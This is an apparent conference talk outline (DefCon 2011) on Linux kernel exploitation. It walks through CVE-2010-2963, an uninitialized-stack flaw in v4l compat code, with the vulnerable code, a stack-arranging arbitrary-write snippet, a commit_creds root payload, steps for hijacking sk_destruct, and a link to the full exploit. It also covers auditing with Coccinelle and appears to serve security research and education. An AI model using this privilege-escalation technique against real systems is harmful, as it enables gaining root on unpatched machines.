# Kernel Exploitation Via Uninitialized Stack
## Kees Cook
### Contact: [PI:EMAIL](mailto:PI:EMAIL)  
### Website: [www.canonical.com](http://www.canonical.com)  
### Date: August 2011

---

## Overview
- **Introduction**
- **Linux Kernel Exploitation Basics**
- **Auditing `copy_from_user()` for Mistakes**
- **Controlling an Uninitialized Stack Variable**
- **Becoming Root**
- **Questions and Answers**

---

## Introduction

### About the Speaker
**Kees Cook**
- Pronounced "Case"
- Twitter: [@kees_cook](https://twitter.com/kees_cook)
- **DefCon Capture the Flag (CTF)**
  - Participated since 2003
  - Won with Team 1@stPlace in 2006 and 2007
  - Continues to participate in qualification rounds for fun
- **Ubuntu Security Team**
  - Joined Canonical in 2006
  - Responsible for maintaining Ubuntu's security
  - Focused on compiler and kernel hardening

---

## Linux Kernel Exploitation Basics

### Key Concepts
- **Arbitrary Write**: The ability to control kernel memory.
  - **Kernel Permissions**: Controls process permissions.
  - **Credentials**: Changing a process's UID to 0 (root).
- **Finding Targets**
  - Hunt through kernel memory for global functions and variables.
  - Potential targets include:
    - **Function Tables**: e.g., `struct security_operations` global pointer (`security_ops` in `include/linux/security.h`)
    - **System-wide IDT (Interrupt Descriptor Table)**
    - **Single, Isolated `struct sock`**: `sk_destruct` called on close, easily found via `/proc/net/tcp`.

### Finding Flaws
- **Theory vs. Practice**: Using a flaw is often easier than finding one.
- **Interface Boundaries**
  - Transitions from user space to kernel space (ring0).
  - Changes in privilege levels.

---

## Auditing `copy_from_user()` for Mistakes

### Identifying Unsafe Uses
- **Number of Callers**: 3893 (as of the last check).
- **Common Issues**
  - Incorrect length checks.
  - Incorrect source checks.
  - Incorrect destination checks.

### Static Analysis Tools
- **Regular Expressions**: Quick and effective for basic analysis.
- **Unchecked `copy_from_user()`**
  - Example: `__copy_from_user()` without `access_ok()`.
  - Notable vulnerabilities:
    - Intel DRM (CVE-2010-2962, discovered by Kees Cook)
    - RDS (CVE-2010-3904, discovered by Dan Rosenberg)

- **Advanced Static Analysis with Coccinelle**
  - **Coccinelle**: A semantic patching tool used for more advanced static analysis.
  - **Example Usage**:
    ```c
    @cfu@
    position p;
    @@
      copy_from_user@p(...)
    @cfu_simple@
    position cfu.p;
    expression f;
    identifier e;
    @@
      (
        copy_from_user@p(&e, f, sizeof(e))
      |
        copy_from_user@p(e, f, sizeof(*e))
      )
    @depends on (!cfu_simple and ... )@
    position cfu.p;
    @@
    * copy_from_user@p(...)
    ```

### Focus Areas
- **Rare Network Protocols**: SCTP, RDS.
- **Interfaces with Few Consumers**: Video DRM, network diagnostics, new syscalls, compat layers.
- **Compat Layers**: Known for frequent bugs.
  - **Syscall Compat**: Not clearing high portions of registers.
  - **API Compat**: Few users, leading to vulnerabilities like CVE-2010-2963.

---

## Controlling an Uninitialized Stack Variable

### Example: CVE-2010-2963
- **Flawed Function**: `get_microcode32` in v4l compat functions.
- **Code Snippet**:
  ```c
  static int get_microcode32(struct video_code *kp, struct video_code32 __user *up) {
    if (!access_ok(VERIFY_READ, up, sizeof(struct video_code32)) ||
        copy_from_user(kp->loadwhat, up->loadwhat, sizeof(up->loadwhat)) ||
        get_user(kp->datasize, &up->datasize) ||
        copy_from_user(kp->data, up->data, up->datasize))
      return -EFAULT;
    return 0;
  }

  static long do_video_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    union {
      struct video_tuner vt;
      struct video_code vc;
      ...
    } karg;
    void __user *up = compat_ptr(arg);
    ...
    switch (cmd) {
      ...
      case VIDIOCSMICROCODE:
        err = get_microcode32(&karg.vc, up);
        ...
    }
  }
  ```
- **Issue**: Unchecked `copy_from_user()` from an uninitialized address on the stack.
- **Solution**: Find an overlapping function or call path to control the stack.

### Overlapping Functions
- **Same IOCTL Call Path**: Use the same ioctl to ensure the same stack size.
- **Stack Memory View**:
  - **Before `VIDIOCSTUNER`**:
    - `tuner`
    - `name[32]`
  - **Before `VIDIOCSMICROCODE`**:
    - `loadwhat[16]`
    - `datasize`
    - `padding`
    - `data`

### Arranging Stack Values
- **Direct Use**: No special tricks needed for `datasize` and `data`.
- **Overlapping Pointer**:
  ```c
  uint64_t *ptr = (uint64_t*)(&(tuner->name[20]));
  *ptr = destination;
  vc->datasize = length;
  vc->data = source;
  ```

### Prime Page Tables
- **Avoid Extra Work**: Ensure no additional work is done between syscalls.
- **Use `int 0x80` for 32-bit Syscalls**:
  ```c
  unsigned int syscall32(unsigned int syscall, unsigned int arg1, unsigned int arg2, unsigned int arg3) {
    unsigned int rc;
    asm volatile(
      "movl %1, %%ebx;   movl %2, %%ecx;\n"
      "movl %3, %%edx;   movl %4, %%eax;\n"
      "int $0x80;                movl %%eax, %0;\n"
      : "=g"(rc)
      : "g"(arg1), "g"(arg2), "g"(arg3), "g"(syscall)
      : "%eax", "%ebx", "%ecx", "%edx"
    );
    return rc;
  }
  ```

### Triggering the Target
- **Close the Socket**: This will trigger the arbitrary write.
- **Payload**:
  ```c
  commit_creds = (_commit_creds)get_kernel_sym("commit_creds");
  prepare_kernel_cred = (_prepare_kernel_cred)get_kernel_sym("prepare_kernel_cred");

  int __attribute__((regparm(3)))
  getroot(void * file, void * vma) {
    commit_creds(prepare_kernel_cred(0));
    return -1;
  }
  ```

---

## Becoming Root

### Steps
1. **Open a TCP Socket**.
2. **Find the Socket in Kernel Memory** using `/proc/net/tcp` or INET_DIAG netlink.
3. **Target the `sk_destruct` Function Pointer**.
4. **Trigger the Payload** by closing the socket.

---

## Demo

- **Follow Along**: [vyakarana.c](http://people.canonical.com/~kees/defcon19/vyakarana.c)

---

## Questions and Answers

- **Thank You!**
- **Contact**: [PI:EMAIL](mailto:PI:EMAIL)
- **Website**: [www.canonical.com](http://www.canonical.com)

---